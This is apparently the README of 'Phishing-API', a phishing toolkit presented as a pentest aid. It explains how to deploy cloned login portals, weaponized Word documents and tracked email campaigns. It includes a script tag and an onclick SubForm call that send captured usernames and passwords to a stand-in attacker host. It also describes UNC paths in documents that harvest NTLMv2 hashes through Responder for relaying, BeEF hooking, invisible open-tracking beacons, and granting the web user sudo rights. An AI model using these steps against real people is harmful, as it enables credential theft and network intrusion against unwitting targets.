# Phishing-API
See my blog @ https://curtbraz.blogspot.com/2018/10/phishapi-tool-rapid-deployment-of-fake.html for more details.  This API has three main features.  One allows you to easily deploy cloned landing pages for credential stealing, another is weaponized Word doc creation, and the third is saved email campaign templates.  Both attack methods are integrated into Slack for real-time alerting.  <b>Unfortunately, I'm no longer running this code as a free service @ https://phishapi.com due to cost, sorry!</b>


## Update

I've added support for MS Word document generation.  Now, simply go to the API to create your payload, email it off, and wait for the Slack notification.  It automatically includes a UNC path back as well (as does the Phishing Portal feature) so if you're running Responder in a background session you can capture NTLMv2 hashes and be notified via Slack!  Support for weaponizing your own Word doc templates is built in.  Just upload an existing doc and download it again to hook it.  You can also choose to use Basic Auth which prompts the user for credentials, just like Phishery does!


<p align="center">
<img src="https://i.imgur.com/M6H7jfg.gif" width="60%"><br />
<b>Auto-Generate Fake Portal</b>
<br/><br/></p>

<p align="center">
<img src="https://i.imgur.com/4TeVrzE.gif" width="60%"><br />
<b>Create Word Maldoc</b>
<br/><br/></p>

<p align="center">
<img src="https://i.imgur.com/fDwFbHy.gif" width="60%"><br />
<b>Weaponize Existing Word Doc</b>
<br/><br/></p>

<p align="center">
<img src="https://i.imgur.com/xCMqAYc.gif" width="60%"><br />
<b>Create or Leverage Saved Email Campaigns</b>
<br/><br/></p>


# To Setup :

1) Import the DB SQL Dump Schema to a new MySQL Instance `mysql -u root -h localhost < DatabaseSQLDump.sql;`

2) Host the PHP (PHP7 is supported!) from a web service (Apache, Nginx, IIS, etc)

3) Configure config.php variables

4) Limit Access to the "Results" Directories (Apache's Basic Auth is Recommended)

5) Use HTTPS (Let's Encrypt!) and a Domain for the Hosted API

6) Add your web service account to /etc/sudoers (www-data for Apache)

7) Optionally run Responder and BeEF in a screen session and import the crontab file

8) Enable browscap in your php.ini config and point to it in your web directory (included in this repo)



# 1) To Use the API for Capturing Credentials from Fake Sites : 

Rapid & Easy Deployment API for Phishing During Pentest Engagements.  Output to MySQL/Web Table &amp; Slack Bot.  Supports BEEF Hooking & HaveIBeenPwned!

<p align="center">
<img src="https://i.imgur.com/MKlHy2k.png" width="60%"><br />
<b>Figure 1: Choose "Fake Portal" From API Options</b>
<br/><br/></p>

<p align="center">
<img src="https://i.imgur.com/UfxzTHQ.png" width="80%"><br />
<b>Figure 2: Choose a Pre-Designed Generic Portal for Landing Page</b>
<br/><br/></p>

<p align="center">
<img src="https://i.imgur.com/V9GOCZ9.png" width="60%"><br />
<b>Figure 3: Fill Out API Details for Landing Page HTML and Optionally Include Your Own Logo</b>
<br/><br/></p>

<p align="center">
<img src="https://i.imgur.com/4MD7kq5.png" width="70%"><br />
<b>Figure 4: Download Automatically Created Source HTML to Host on a Standalone Server</b>
<br/><br/></p>

<p align="center">
<img src="https://i.imgur.com/E7ZLcam.png" width="90%"><br />
<b>Figure 5: The Hosted Site's Contents</b>
<br/><br/></p>

## OR

<b>If you don't wish to use a pre-populated landing page template or one doesn't exist that you would like to use, feel free to create or clone your own.  Simply : </b><br><br>

1) Add the external script source in the `<head>` element

	`<script src="https://YOUR_PHISHAPI_URL.com/APICredentialFormSubmit.js"></script>`

2) Change or add an "onclick" attribute to the submit button for the login form and fill out the arguments

	`<buttom value="Submit!" onclick="SubForm('PhishAPI_URL_HERE','NAME/ID_OF_LOGIN_FORM','PROJECT_NAME','SLACK_BOT_NAME','SLACK_EMOJI','USER_FIELD_NAME/ID','PASS_FIELD_NAME/ID','SOURCE_URL_HERE','CSRF_TOKEN_HERE')">`
	
	PhishAPI_URL_HERE = https://YOUR_PHISHAPI_URL.com (wherever you're hosting the API)<br />
	NAME/ID_OF_LOGIN_FORM = Whatever the cloned `<form name="">` is set to for the page you cloned<br />
	PROJECT_NAME = Self explanatory. The name of the org/client you're targeting (ex. Walmart)<br />
	SLACK_BOT_NAME = I use "PhishBot"<br />
	SLACK_EMOJI = I use `:fishing_pole_and_fish:`<br />
	USER_FIELD_NAME/ID = Name or ID of the username/email field (`<input name="username">` or `<input id="user">`)<br />
	PASS_FIELD_NAME/ID = Name or ID of the password field (`<input name="password">` or `<input id="pass">`)<br />
	SOURCE_URL_HERE = Original Address You Cloned the Site From (ex. https://TARGET_URL.com/logon.html)<br />
	CSRF_TOKEN_HERE = Leave blank unless the site you're cloning has a CSRF token.  If so provide the Name/ID here (`<input type="hidden" name="csrf_token" value="XDLKJSDLKJLDKJDLKJFSLKLSF">` so "csrf_token" is what you would use)

4) Sit back and wait for the Slack bot to notify you.  When you want to see the credentials visit https://YOUR-API-HERE/results using your basic auth credentials or click the link in the Slack notification.<br><br>

<p align="center">
<img src="https://i.imgur.com/L8yYRMQ.png" width="70%"><br />
<b>Figure 6: Someone Entered Credentials into the Fake Portal - Slack Alert</b>
<br/><br/></p>

<p align="center">
<img src="https://i.imgur.com/oXy9dEE.png" width="80%"><br />
<b>Figure 7: BeEF Hook Slack Alert (Optional in Case You Want to React Quickly w/ Modules)</b>
<br/><br/></p>

<p align="center">
<img src="https://i.imgur.com/CcSw4TT.png" width="100%"><br />
<b>Figure 8: Captured NTLMv2 Hash Exposed via Browser</b>
<br/><br/></p>

<p align="center">           
<img src="https://i.imgur.com/xdeSaWC.png"><br />
<b>Figure 9: Clicking the Slack Link Allows Viewing Credentials</b>
<br /><br/>
</p><br><br><br><br>

# 2) To Use the API for Generating Word Doc Payloads :

1) Modify /phishingdocs/index.php to include your Slack Webhook parameters

2) Create /var/www/uploads Path and make sure your web user has sudoers access

3) Browse out to YOUR_URL.com and select "Weaponized Documents" to generate your DOCX

4) Optionally set up [Responder](https://github.com/SpiderLabs/Responder "Responder") in a background process and run `phishinghashes.sh` every minute or so with cron

5) Set up your php.ini to allow uploads of at least 15MB and enable browsecap.ini for parsing UserAgent strings, otherwise some functionality may be limited.  

6) Email your doc and wait for the Slack alerts!

<p align="center"><b>Bonus points if you use your docs as honeypot bait! :)</b></p>

<br /><br/>
<p align="center">
<img src="https://i.imgur.com/LW4BUjN.png"><br />
<b>Figure 1: Web Based Payload Generation - Create New Doc or Upload Existing w/ Payload Options</b>
</p>
                  
            
<br /><br/>
<p align="center">
<img src="https://i.imgur.com/onsPyFp.png"><br />
<b>Figure 2: Opening Document Generated (New) by Service</b>
</p>


<br /><br/>
<p align="center">
<img src="https://i.imgur.com/sw8JWQE.png" width="40%"><br />
<b>Figure 3: If "Auth Prompt" is Selected in Payload Options, Display Basic Auth Prompt to User for Credential Capturing (like Phishery)</b>
</p>
                  

<br /><br/>
<p align="center">
<img src="https://i.imgur.com/HlY3T4G.png" width="80%"><br />
<b>Figure 4: HTTP Beacon is Selected by Default and Alerts When the Target Opens the Document</b>
</p>


<br /><br/>
<p align="center">
<img src="https://i.imgur.com/ku6UTNI.png" width="75%"><br />
<b>Figure 5: If Credentials are Entered from Figure 3 Above, Notify via Slack When Captured</b>
</p>


<br /><br/>
<p align="center">
<img src="https://i.imgur.com/OO0sjDR.png"><br />
<b>Figure 6: Clicking on the Slack Alert Displays Captured Details (Hashes, Credentials, Client Details)</b>
</p>


<br /><br/>
<p align="center">
<img src="https://i.imgur.com/qZFGmXA.png"><br />
<b>Figure 7: Slack Alert when UNC/SMB Hashes are Received from Word Document</b>
</p>


<br /><br/>
<p align="center">
	<b>Currently, I'm running <a href="https://github.com/SpiderLabs/Responder">Responder</a> in a Screen session with <i>phishinghashes.sh</i> scheduled via Cron to run every minute to pick up hashes, correlate phished users, and alert via Slack.  You can also relay those hashes with another tool if you'd like to take things even further.  Enjoy! :)</b></p>




# 3) To Use the API to Store and Generate Email Campaign Templates : 

Leverage a template by creating or choosing an existing template from the local repository, or, you can compose a blank email and embed the invisible HTML beacon to be notified when the recipient opens their email.

<br />
<p align="center">
<img src="https://i.imgur.com/AmwZbbF.png"><br />
<b>Figure 1: Existing, New, or No Campaign Choices</b>
</p>


If a new campaign is chosen, you can create variables for dynamic re-use in the future and store them as HTML templates in a database.  The WYSIWYG editor makes things simple, but you can also copy and paste from a text editor or another source if you'd like!

<br />
<p align="center">
<img src="https://i.imgur.com/COHaq6q.png"><br />
<b>Figure 2: New Campaign w/ Variables & Images</b>
</p>


Next time, choosing the existing template will dynamically provide input fields for the stored variables.  They can be applied in real time using JavaScript to update the email body.  Checking the "Embed Notification for Opened Email" box will automatically append invisible code to your template that will alert you when your recipient opens their email.  (Images must be allowed to render for this to work)

<br />
<p align="center">
<img src="https://i.imgur.com/SsBAqKv.png" width="75%"><br />
<b>Figure 3: Existing Campaign</b>
</p>


Sit back and watch as your target opens their email and cross your fingers you later recieve another alert for BeEF, Maldocs, or your captured credentials!

<br />
<p align="center">
<img src="https://i.imgur.com/jJ5dGlRr.png"><br />
<b>Figure 4: Notification of Email Opened by Recipient</b>
</p>

<b>Enjoy! :)
